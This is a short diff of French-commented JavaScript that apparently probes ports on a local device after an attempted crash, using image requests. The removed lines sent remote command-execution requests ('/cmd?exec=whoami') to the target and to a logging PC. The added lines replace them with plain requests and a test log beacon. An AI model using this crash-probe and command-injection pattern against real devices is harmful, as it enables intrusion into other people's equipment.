@@ -378,9 +378,9 @@
                 ports.forEach(port => {
                     var img = new Image();
                     img.onload = () => {
-                        postCrashResults.push(`Port ${port}: Réponse post-crash`);
+                        postCrashResults.push(`Port ${port}: Réponse (peut-être 505 ou 501)`);
                         var cmdImg = new Image();
-                        cmdImg.src = `http://${ip}:${port}/cmd?exec=whoami`;
+                        cmdImg.src = `http://${ip}:${port}/`; // Requête simple
                     };
                     img.onerror = () => postCrashResults.push(`Port ${port}: Pas de réponse`);
                     img.src = `http://${ip}:${port}/postcrash`;
@@ -417,9 +417,9 @@
         // Log to PC
         function logToPC() {
             try {
-                var ipPC = '192.168.1.34'; // Remplace par l'IP de ton PC
+                var ipPC = '192.168.1.91'; // Remplace par l'IP de ton PC
                 var img = new Image();
-                img.src = `http://${ipPC}:8081//cmd?exec=whoami`;
+                img.src = `http://${ipPC}:8081/log?data=Test`; // Port 8081
                 updateStatus('Log envoyé au PC');
             } catch (e) {
                 updateStatus('Erreur log PC');
